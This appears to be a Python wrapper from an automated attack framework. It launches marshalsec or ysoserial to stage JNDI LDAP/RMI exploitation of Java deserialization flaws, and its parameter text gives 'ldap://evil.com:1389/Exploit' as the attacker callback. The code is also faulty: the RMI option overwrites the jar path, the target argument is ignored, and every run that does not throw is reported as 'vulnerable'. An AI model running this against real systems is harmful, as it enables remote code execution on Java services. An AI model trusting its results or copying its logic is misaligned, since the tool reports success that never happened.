# tools/marshalsec_tool.py
# Marshalsec - Java 反序列化漏洞利用工具
import os
import glob
import json
import subprocess
from typing import Dict, Any
from tool_framework import CommandLineTool


class MarshalsecTool(CommandLineTool):
    """
    Marshalsec 封装 - Java 反序列化漏洞利用工具
    支持 JNDI、RMI 等多种利用方式

    备选方案: 如果 marshalsec.jar 不可用，使用 ysoserial 作为替代
    """

    def __init__(self):
        super().__init__("java")
        # 支持多种路径格式
        self.jar_paths = [
            "/app/thirdparty/marshalsec.jar",
            "/app/thirdparty/Marshalsec.jar",
        ]
        # 使用 glob 查找编译后的 jar
        compiled_jars = glob.glob("/app/thirdparty/marshalsec/target/marshalsec-*.jar")
        self.jar_paths.extend(compiled_jars)

        self.jar_path = None
        for path in self.jar_paths:
            if os.path.exists(path):
                self.jar_path = path
                break

        # 备选: ysoserial (功能类似，更常用)
        self.ysoserial_path = "/app/thirdparty/ysoserial.jar"
        self.use_ysoserial_fallback = False
        if not self.jar_path and os.path.exists(self.ysoserial_path):
            self.use_ysoserial_fallback = True
            print("[Marshalsec] marshalsec.jar 不可用，使用 ysoserial 作为备选")

        self.timeout = 60

    def name(self) -> str:
        return "marshalsec"

    def description(self) -> str:
        return "Java 反序列化漏洞利用工具，支持 JNDI 注入、RMI 回连等多种攻击向量"

    def supported_vulns(self) -> list:
        return ["Java Deserialization", "JNDI Injection", "RMI Exploitation", "LDAP Injection"]

    def check_available(self) -> bool:
        import shutil
        java_exists = shutil.which("java") is not None
        jar_exists = self.jar_path is not None or os.path.exists(self.ysoserial_path)
        return java_exists and jar_exists

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "type": {
                "type": "str",
                "description": "利用类型: JNDI, RMI, LDAP (默认 JNDI)",
                "required": False,
                "default": "JNDI"
            },
            "payload_type": {
                "type": "str",
                "description": "Payload 类型，如 JRMPClient, JRMPListener",
                "required": False,
                "default": "JRMPClient"
            },
            "callback_host": {
                "type": "str",
                "description": "回连服务器地址，如 ldap://evil.com:1389/Exploit",
                "required": True
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        exploit_type = params.get("type", "JNDI")
        payload_type = params.get("payload_type", "JRMPClient")
        callback_host = params.get("callback_host")

        if not callback_host:
            raise ValueError("必须提供 callback_host 参数")

        # 选择使用哪个 jar
        if self.use_ysoserial_fallback:
            # 使用 ysoserial 作为备选
            jar_path = self.ysoserial_path
            cmd = [
                "java", "-jar", jar_path,
                "JRMPClient", callback_host
            ]
            tool_name = "ysoserial"
        else:
            jar_path = self.jar_path
            if not jar_path or not os.path.exists(jar_path):
                return {"success": False, "error": "marshalsec.jar 和 ysoserial.jar 都不可用", "vulnerable": False}

            cmd = [
                "java", "-cp", jar_path,
                "marshalsec.jndi.LDAPRefServer",
                callback_host
            ]
            tool_name = "marshalsec"

            # 根据类型调整命令
            if exploit_type == "RMI":
                cmd[2] = "marshalsec.jndi.RMIRefServer"

        try:
            raw_result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            result = {
                "success": True,
                "vulnerable": True,
                "tool_used": tool_name,
                "exploit_type": exploit_type,
                "payload_type": payload_type,
                "callback_host": callback_host,
                "command_used": " ".join(cmd),
                "summary": f"{tool_name} {exploit_type} 利用准备就绪"
            }

            result["stdout"] = stdout
            result["stderr"] = stderr
            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }